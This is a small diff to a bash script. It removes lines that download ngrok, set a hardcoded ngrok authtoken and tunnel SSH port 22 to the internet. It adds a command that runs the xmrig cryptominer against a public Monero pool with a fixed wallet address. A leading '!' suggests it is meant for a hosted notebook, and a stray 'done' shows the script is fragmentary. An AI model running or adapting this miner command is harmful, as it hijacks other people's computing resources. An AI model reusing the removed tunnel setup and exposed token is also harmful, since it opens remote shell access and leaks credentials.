@@ -1,11 +1,6 @@
 #!/bin/bash
 
-wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-
-unzip -qq -n ngrok-stable-linux-amd64.zip
-
-./ngrok authtoken  1eJ879JFo0Lde3KB9Z3E7R0q8vN_7CF88NU5Q1epjY9k5Nomr
-./ngrok http 22  
+! ./xmrig --coin 'XMR' -o pool.supportxmr.com:5555 -u 47sPa3gqZR8UVxst5P2k15TzUatq7qHdrHshf5sCxnVUQMUmERdDp6XQ87priFXYcAKttq1tkReaYgSMz2fEksQZ93n1HPV  -p xn
 
  done 
 
